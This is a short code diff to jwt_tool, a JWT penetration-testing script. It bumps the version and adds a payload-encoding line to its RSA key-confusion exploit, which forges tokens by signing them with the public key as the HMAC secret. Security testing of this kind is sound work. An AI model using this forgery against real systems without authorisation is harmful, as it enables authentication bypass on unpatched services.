@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 #
-# JWT_Tool version 2.1.0 (10_11_2020)
+# JWT_Tool version 2.1.1 (17_12_2020)
 # Written by Andy Tyler (@ticarpi)
 # Please use responsibly...
 # Software URL: https://github.com/ticarpi/jwt_tool
 # Web: https://www.ticarpi.com
 # Twitter: @ticarpi
 
-jwttoolvers = "2.1.0"
+jwttoolvers = "2.1.1"
 import ssl
 import sys
 import os
@@ -1704,6 +1704,7 @@ def runExploits():
             # exit(1)
         elif args.exploit == "k":
             if config['crypto']['pubkey']:
+                paylB64 = base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
                 newTok, newSig = checkPubKeyExploit(headDict, paylB64, config['crypto']['pubkey'])
                 desc = "EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)\n(This will only be valid on unpatched implementations of JWT.)"
                 jwtOut(newTok+"."+newSig, "RSA Key Confusion Exploit", desc)
